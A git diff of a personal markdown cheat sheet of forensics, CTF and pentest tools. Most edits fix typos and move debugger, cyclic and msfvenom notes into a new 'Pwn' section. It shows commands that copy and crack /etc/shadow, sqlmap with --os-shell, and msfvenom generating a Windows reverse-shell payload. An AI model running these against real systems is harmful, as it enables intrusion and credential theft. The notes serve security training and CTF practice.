@@ -1,17 +1,17 @@
 # Forensics
 ## OCR
-* Tesseract OCR, simple command line OCR tool
+* `tesseract` OCR, simple command line OCR tool
 ```bash
 tesseract INPUT.png OUTPUT_FILE
 ```
 
 ## PDF to Image Conversion
-* Convert PDFs to ppms
+* Convert `PDFs` to `ppms`
 ```bash
 pdftoppm main.pdf outputname -png
 ```
 
-* Convert PNG to PDF
+* Convert `PNG` to `PDF`
 ```bash
 convert *.png output.pdf
 ```
@@ -28,19 +28,19 @@ python2 PCRT.py -v -f input.png
 ```
 
 ## xxd
-* Make a hexdump of a file, `-p`  means in plain hexdump no addresses, `-r` means revert from hexdump to binary, `-c{i}` means print `i` amount of colum to print out, where each column is one byte
-* To reverse the entire hex vaule of a file
+* Make a `hexdump` of a file, `-p`  means in plain `hexdump` no addresses, `-r` means revert from `hexdump` to binary, `-c{i}` means print `i` amount of column to print out, where each column is one byte
+* To reverse the entire hex value of a file
 ```bash
 xdd -p -c1 file.png | tac | xdd -r -p file_rev.png
 ```
 ## BZCAT
-* `bzcat` allow you to see the content of a bz zipped file without the need to uncompress it
+* `bzcat` allow you to see the content of a `bz` zipped file without the need to uncompress it
 ```bash
 bzcat file.bz2
 ```
 
 ## zipdetails
-* `zipdetails` allows you to see the deatils of a zip, pretty straight forward and useful.
+* `zipdetails` allows you to see the details of a zip, pretty straight forward and useful.
 ```bash
 zipdetails file
 ```
@@ -57,7 +57,7 @@ pdfunite 1.pdf 2.pdf out.pdf
 ```
 
 ## zsteg
-* User `zsteg` to extract Zlib Compression
+* User `zsteg` to extract `zlib` Compression
 ```bash
 zsteg a.png
 ```
@@ -79,21 +79,6 @@ sudo cp etc/passwd etc/shadow ~
 cd
 sudo unshadow passwd shadow > unshadow
 john unshadow
-```
-
-## Cyclic
-* Generate a pattern of length `800` characters
-```
-cyclic 800
-```
-
-* To look up pattern `haau` in previously generated pattern, make sure it is in the correct endianess, value show in `eip` is flipped due to senind via a network channel, try both endianess when searching and make an educated guess as to which one is more correct as it will be closer to the target payload length.
-```
-cyclic -l uaah
-```
-* Or we can use this... (the pure hex value)
-```
-cyclic -l 0x68616175
 ```
 
 ## Figlet!
@@ -126,7 +111,7 @@ script
 ```
 
 ## Maximum efficiency grep! 
-* MAX EFFICENT GREP USAGE HERE! Use `ls` to generate a list of directory which is then passed into `xargs` , `-P 0` means maximum concurrent threads, and then suppresses error message to `/dev/null`, `-I folder` means replace all inputs for `xargs` to be `folder`, like setting a vvariable name
+* MAX EFFICIENT GREP USAGE HERE! Use `ls` to generate a list of directory which is then passed into `xargs` , `-P 0` means maximum concurrent threads, and then suppresses error message to `/dev/null`, `-I folder` means replace all inputs for `xargs` to be `folder`, like setting a variable name
 ```bash
 ls | xargs -P 0 -I folder grep -ri flag folder 2> /dev/null | grep flag{.*}
 ```
@@ -153,7 +138,7 @@ List of experiences
 ```
 
 ## Creating a simple HTTP server
-* We can create a simple HTTP server with `python`, will host anyfile on the current path.
+* We can create a simple HTTP server with `python`, will host any file on the current path.
 ```bash
 python2
 python -m SimpleHTTPServer 1337
@@ -167,31 +152,14 @@ python3 -m http.server 1337
 php -S 0.0.0.0:1337
 ```
 
-* With `ruby`, `-run` to load `un.rb` which contains replacements for common unix commands, `-e httpd` to run http server, `.` to serve content from current direcotory, `-p` for port number. 
+* With `ruby`, `-run` to load `un.rb` which contains replacements for common Unix commands, `-e httpd` to run http server, `.` to serve content from current directory, `-p` for port number. 
 ```bash
 ruby -run -e httpd . -p 1337
 ```
 
-## Immunity Debugger
-* To search for a constant string:
-    * right click the assembly code pane
-    * `Search for` -> `All referenced text strings`
-
-`LEAVE` assembly instruction place the return address on to the top of the stack, and `RETN` pops the top of the stack and jump to it.
-
-| Shortcut | Description |
-|:-----:|:------:|
-| `F2` | Set a break point|
-| `F3` | Open a file|
-| `F7` | Steps into a function|
-| `F8` | Step over an instruction|
-| `F9` | Run a program|
-| `Ctrl + F9` | Execute until the end of return, allow us to see the result of the function call|
-| `Ctrl + F1` | Attach a running process|
-
 # Android debugging
 ## apktool
-* Recompile apk files
+* Recompile `apk` files
 ```bash
 apktool d APP.apk
 apktool b APP/ -o newAPP.apk
@@ -203,7 +171,7 @@ apktool b APP/ -o newAPP.apk
 keytool -alias KEY_ALIAS -genkey -v -keystore my-release-key.keystore -keyalg RSA -keysize 2048 -validity 10000
 ```
 
-* Use `jarsigner` to sign the new APK file with the key generated with `keytool`
+* Use `jarsigner` to sign the new `APK` file with the key generated with `keytool`
 ```bash
 jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore newAPP.apk KEY_ALIAS
 ```
@@ -240,7 +208,7 @@ python3 sherlock.py username1 username2
 3. Drag the file to a new tab, and click `Trust the certificate`
 
 ### FoxyProxy Basic 
-* A firefox porxy manager, 
+* A Firefox proxy manager, 
 * Click on icon -> `Options` -> `Add` -> 
 ## Bettercap
 * Probe the network first and then see the list of connected host
@@ -256,7 +224,7 @@ set net.sniff.output ~/bettercap_sniff.pcap
 net.sniff on
 ```
 ## axel
-* command line download accelerator!! `-n` specifies number of multiple connections, `-a` gives a better progress bar. Make sure that the output file does not exist, or will get a state file not exisit error!
+* command line download accelerator!! `-n` specifies number of multiple connections, `-a` gives a better progress bar. Make sure that the output file does not exist, or will get a state file not exist error!
 ```bash
 axel -a -n 20 -o output https://google.com
 ```
@@ -289,7 +257,7 @@ dirb http://127.0.0.1 -r -z 10
 
 ## httpie
 * I did not think that there exist such tool that make http request looks so simple and pretty!
-* It will default to GET / POST if you provide any data! VERY easy to use, note that if you want to send speical character in POST, write it to a json file and pass it in stead of cmd
+* It will default to GET / POST if you provide any data! VERY easy to use, note that if you want to send special character in POST, write it to a `JSON` file and pass it in stead of `cmd`
 ```bash
 http URL
 http URL hello=world
@@ -332,3 +300,63 @@ sqlmap -u http://127.0.0.1/debug.php?id=1 -p "id" --dbms=mysql --os-shell
 ## TCPView
 * Microsoft `TCPView` is a Windows Sysinternal tool that is able to show which process is using which port. kind of like `netstat`. `Ctrl + R` to disable resolving addresses for easier view.
 
+
+# Pwn
+## Immunity Debugger
+* To search for a constant string:
+    * right click the assembly code pane
+    * `Search for` -> `All referenced text strings`
+
+`LEAVE` assembly instruction place the return address on to the top of the stack, and `RETN` pops the top of the stack and jump to it.
+
+| Shortcut | Description |
+|:-----:|:------:|
+| `F2` | Set a break point|
+| `F3` | Open a file|
+| `F7` | Steps into a function|
+| `F8` | Step over an instruction|
+| `F9` | Run a program|
+| `Ctrl + F9` | Execute until the end of return, allow us to see the result of the function call|
+| `Ctrl + F1` | Attach a running process|
+
+* `Immunity` uses `mona.py` script. `modules` shows all information about the `DLL`s that are loaded by current program in the process memory space. This is similar to `gdb`'s `vmmap`. Make sure the address don't contain have any bad characters and they are static, meaning No `ASLR`.
+```
+!mona modules
+```
+
+* Search for a specific Opcode sequence with `mona find -s` within a `DLL`(module) with `-m` flag
+```
+!mona find -s "\xff\xe4" -m "a.dll"
+```
+
+### Endianess
+We have to put our payload address in reverse order. The OS can store addresses and data in memory in Little or Big Endian. In little Endian format, the low order byte of the number is stored in the memory at the lowest address, and the high order byte at the highest address. Therefore, we have to construct the payload address in reverse order because we are overwriting the return address from the opposite direction.
+
+## Cyclic
+* Generate a pattern of length `800` characters
+```
+cyclic 800
+```
+
+* To look up pattern `haau` in previously generated pattern, make sure it is in the correct endianess, value show in `eip` is flipped due to sending via a network channel, try both endianess when searching and make an educated guess as to which one is more correct as it will be closer to the target payload length.
+```
+cyclic -l uaah
+```
+* Or we can use this... (the pure hex value)
+```
+cyclic -l 0x68616175
+```
+
+## `msf-nasm_shell`
+`nasm`, the Netwide Assembler, is an assembler and disassembler for Intel x86 architecture. We can `msf-nasm_shell` use to find a corresponding Assembly Opcodes for a target Assembly code.
+```
+nasm> jmp esp
+00000000 FFE4
+```
+
+## msfvenom
+`msfvenom` is a Metasploit framework that generates shell code payload.
+* `-p` specifies the payload module, inside `/usr/share/metasploit-framework/modules/`, `LHOST` indicates Local HOST (our own machine) to connect to for reverse shell, and `LPORT` specifies the TCP port that we are listening on, `-fc` is the shellcode `format` in `c`
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -fc
+```
